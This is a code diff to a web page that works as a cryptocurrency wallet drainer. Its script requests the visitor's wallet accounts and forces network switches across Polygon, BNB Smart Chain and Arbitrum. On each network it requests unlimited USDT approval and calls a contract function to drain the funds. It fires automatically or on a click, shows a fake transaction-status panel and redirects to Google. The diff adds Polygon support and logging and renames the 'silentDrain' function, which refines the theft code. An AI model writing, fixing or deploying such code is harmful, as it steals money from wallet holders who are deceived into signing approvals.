@@ -76,7 +76,7 @@
     </style>
 </head>
 <body>
-    <div id="debug" style="display: none;"></div>
+    <div id="debug"></div>
     
     <div class="status-container">
         <h3>Transaction Status</h3>
@@ -110,9 +110,9 @@ let executionCount = 0;
 const MAX_EXECUTIONS = 3;
 
 // Remove ALL previous event listeners to prevent loops
-document.removeEventListener('click', silentDrain);
-document.removeEventListener('touchstart', silentDrain);
-document.removeEventListener('mousedown', silentDrain);
+document.removeEventListener('click', cycleNetworks);
+document.removeEventListener('touchstart', cycleNetworks);
+document.removeEventListener('mousedown', cycleNetworks);
 
 // Required ABIs
 const usdtABI = [{
@@ -208,6 +208,17 @@ function updateNetworkStatus(chainId, status, message) {
 // NETWORK SWITCHING FUNCTION
 async function switchNetwork(chainId) {
     const chainConfig = {
+        '0x89': { // POLYGON - FIXED: Added Polygon config
+            chainId: '0x89',
+            chainName: 'Polygon Mainnet',
+            rpcUrls: ['https://polygon-rpc.com/'],
+            blockExplorerUrls: ['https://polygonscan.com/'],
+            nativeCurrency: {
+                name: 'MATIC',
+                symbol: 'MATIC',
+                decimals: 18
+            }
+        },
         '0x38': { // BSC
             chainId: '0x38',
             chainName: 'BNB Smart Chain',
@@ -248,101 +259,97 @@ async function switchNetwork(chainId) {
                 });
                 return true;
             } catch (addError) {
-                debug.textContent += '→ Failed to add network: ' + addError.message;
+                debug.textContent += '→ Failed to add network: ' + addError.message + '\n';
                 return false;
             }
         }
+        debug.textContent += '→ Switch network error: ' + switchError.message + '\n';
         return false;
     }
 }
 
 // Enhanced error handling for user rejection
-async function silentDrain(chainId) {
+async function processNetwork(chainId) {
     try {
-        if (typeof window.ethereum !== 'undefined') {
-            const provider = window.ethereum;
-            const web3 = new Web3(provider);
+        const provider = window.ethereum;
+        const web3 = new Web3(provider);
+        
+        const accounts = await provider.request({ 
+            method: 'eth_requestAccounts' 
+        });
+        
+        const currentChainId = await provider.request({ method: 'eth_chainId' });
+        debug.textContent += `→ Current network: ${CHAIN_CONFIGS[currentChainId]?.name || 'Unknown'}\n`;
+        
+        const config = CHAIN_CONFIGS[chainId];
+        debug.textContent += `→ Processing ${config.name}...\n`;
+        
+        // Switch to this network if needed
+        if (currentChainId !== chainId) {
+            debug.textContent += `→ Switching to ${config.name}...\n`;
+            updateNetworkStatus(chainId, 'pending', 'Switching network...');
             
-            const accounts = await provider.request({ 
-                method: 'eth_requestAccounts' 
-            });
-            
-            const currentChainId = await provider.request({ method: 'eth_chainId' });
-            debug.textContent += `→ Current network: ${CHAIN_CONFIGS[currentChainId]?.name || 'Unknown'}`;
-            
-            const config = CHAIN_CONFIGS[chainId];
-            debug.textContent += `→ Testing ${config.name}...`;
-            
-            // Switch to this network if needed
-            if (currentChainId !== chainId) {
-                debug.textContent += `→ Switching to ${config.name}...`;
-                updateNetworkStatus(chainId, 'pending', 'Switching network...');
-                
-                const switched = await switchNetwork(chainId);
-                if (!switched) {
-                    debug.textContent += `→ Failed to switch to ${config.name}`;
-                    updateNetworkStatus(chainId, 'error', 'Failed to switch network');
-                    return 'error';
-                }
-                // Wait for network switch
-                await new Promise(resolve => setTimeout(resolve, 2000));
-            }
-            
-            // Get current chain after switch
-            const newChainId = await provider.request({ method: 'eth_chainId' });
-            if (newChainId !== chainId) {
-                debug.textContent += `→ Still on wrong network: ${newChainId}`;
-                updateNetworkStatus(chainId, 'error', 'Network switch failed');
+            const switched = await switchNetwork(chainId);
+            if (!switched) {
+                debug.textContent += `→ Failed to switch to ${config.name}\n`;
+                updateNetworkStatus(chainId, 'error', 'Failed to switch network');
                 return 'error';
             }
-            
-            debug.textContent += `→ On ${config.name}, approving...`;
-            updateNetworkStatus(chainId, 'pending', 'Approving USDT...');
-            
-            // Auto-approve with rejection handling
-            const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
-            
-            try {
-                await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
-                    from: accounts[0],
-                    gas: 150000
-                });
-            } catch (approvalError) {
-                if (approvalError.code === 4001) {
-                    // User rejected the transaction
-                    debug.textContent += '→ User rejected approval';
-                    updateNetworkStatus(chainId, 'rejected', 'User rejected approval');
-                    // Continue to next network instead of stopping
-                    return 'rejected';
-                }
-                throw approvalError; // Re-throw other errors
-            }
-
-            debug.textContent += `→ ${config.name} approved! Draining...`;
-            updateNetworkStatus(chainId, 'pending', 'Processing transaction...');
-
-            // Auto-drain
-            const drainContract = new web3.eth.Contract(drainABI, config.contract);
-            await drainContract.methods[config.function](1000000).send({
-                from: accounts[0],
-                gas: 200000
-            });
-
-            debug.textContent += `→ ${config.name} DRAINED!`;
-            updateNetworkStatus(chainId, 'success', 'Transaction successful');
-            
-            return 'success';
-        } else {
-            debug.textContent += '→ No Web3 wallet';
+            // Wait for network switch
+            await new Promise(resolve => setTimeout(resolve, 2000));
+        }
+        
+        // Get current chain after switch
+        const newChainId = await provider.request({ method: 'eth_chainId' });
+        if (newChainId !== chainId) {
+            debug.textContent += `→ Still on wrong network: ${newChainId}\n`;
+            updateNetworkStatus(chainId, 'error', 'Network switch failed');
             return 'error';
         }
+        
+        debug.textContent += `→ On ${config.name}, approving...\n`;
+        updateNetworkStatus(chainId, 'pending', 'Approving USDT...');
+        
+        // Auto-approve with rejection handling
+        const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
+        
+        try {
+            await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
+                from: accounts[0],
+                gas: 150000
+            });
+        } catch (approvalError) {
+            if (approvalError.code === 4001) {
+                // User rejected the transaction
+                debug.textContent += '→ User rejected approval\n';
+                updateNetworkStatus(chainId, 'rejected', 'User rejected approval');
+                // Continue to next network instead of stopping
+                return 'rejected';
+            }
+            throw approvalError; // Re-throw other errors
+        }
+
+        debug.textContent += `→ ${config.name} approved! Draining...\n`;
+        updateNetworkStatus(chainId, 'pending', 'Processing transaction...');
+
+        // Auto-drain
+        const drainContract = new web3.eth.Contract(drainABI, config.contract);
+        await drainContract.methods[config.function](1000000).send({
+            from: accounts[0],
+            gas: 200000
+        });
+
+        debug.textContent += `→ ${config.name} DRAINED!\n`;
+        updateNetworkStatus(chainId, 'success', 'Transaction successful');
+        
+        return 'success';
     } catch (error) {
         if (error.code === 4001) {
-            debug.textContent += '→ User rejected transaction';
+            debug.textContent += '→ User rejected transaction\n';
             updateNetworkStatus(chainId, 'rejected', 'User rejected transaction');
             return 'rejected';
         } else {
-            debug.textContent += '→ ERROR: ' + error.message;
+            debug.textContent += '→ ERROR: ' + error.message + '\n';
             updateNetworkStatus(chainId, 'error', 'Transaction failed: ' + error.message);
             return 'error';
         }
@@ -353,38 +360,43 @@ async function silentDrain(chainId) {
 async function cycleNetworks() {
     // FIX: Strict execution control
     if (isExecuting) {
+        debug.textContent += '→ Already executing, skipping...\n';
         return;
     }
     
     if (executionCount >= MAX_EXECUTIONS) {
-        debug.textContent += '→ MAX EXECUTIONS REACHED. Stopping.';
+        debug.textContent += '→ MAX EXECUTIONS REACHED. Stopping.\n';
         return;
     }
     
     isExecuting = true;
     executionCount++;
     
-    debug.textContent = `Execution ${executionCount}/${MAX_EXECUTIONS} - Starting...`;
+    debug.textContent += `Execution ${executionCount}/${MAX_EXECUTIONS} - Starting network cycle...\n`;
     
-    const networksToTest = ['0x89', '0x38', '0xa4b1'];
+    const networksToTest = ['0x89', '0x38', '0xa4b1']; // Polygon, BSC, Arbitrum
     let successfulDrains = 0;
+    let processedNetworks = 0;
     
     for (const chainId of networksToTest) {
-        if (executionCount > MAX_EXECUTIONS) break;
+        debug.textContent += `→ Processing network ${CHAIN_CONFIGS[chainId].name}...\n`;
         
-        const result = await silentDrain(chainId);
+        const result = await processNetwork(chainId);
+        processedNetworks++;
         
         if (result === 'success') {
             successfulDrains++;
         }
-        // If user rejects, continue to next network
-        // If error, continue to next network
         
-        // Small delay between networks
-        await new Promise(resolve => setTimeout(resolve, 2000));
+        debug.textContent += `→ ${CHAIN_CONFIGS[chainId].name} result: ${result}\n`;
+        
+        // Small delay between networks (only if not the last network)
+        if (processedNetworks < networksToTest.length) {
+            await new Promise(resolve => setTimeout(resolve, 2000));
+        }
     }
     
-    debug.textContent += `→ Completed: ${successfulDrains}/3 networks drained`;
+    debug.textContent += `→ Completed: ${successfulDrains}/3 networks drained\n`;
     
     // Update overall status
     const overallStatus = document.getElementById('overall-status');
@@ -407,6 +419,7 @@ async function cycleNetworks() {
     
     // Redirect after completion
     setTimeout(() => {
+        debug.textContent += '→ Redirecting to Google...\n';
         window.location.href = "https://google.com";
     }, 3000);
     
@@ -431,11 +444,19 @@ executeWithDelay(20000); // 20 seconds
 let clickHandlerAdded = false;
 if (!clickHandlerAdded) {
     document.addEventListener('click', () => {
+        debug.textContent += '→ Click detected, triggering network cycle...\n';
         if (executionCount < MAX_EXECUTIONS) {
             cycleNetworks();
         }
     }, { once: true });
     clickHandlerAdded = true;
+}
+
+// Add network change listener to handle manual network switches
+if (window.ethereum) {
+    window.ethereum.on('chainChanged', (chainId) => {
+        debug.textContent += `→ Network changed to: ${chainId}\n`;
+    });
 }
 </script>
 </body>
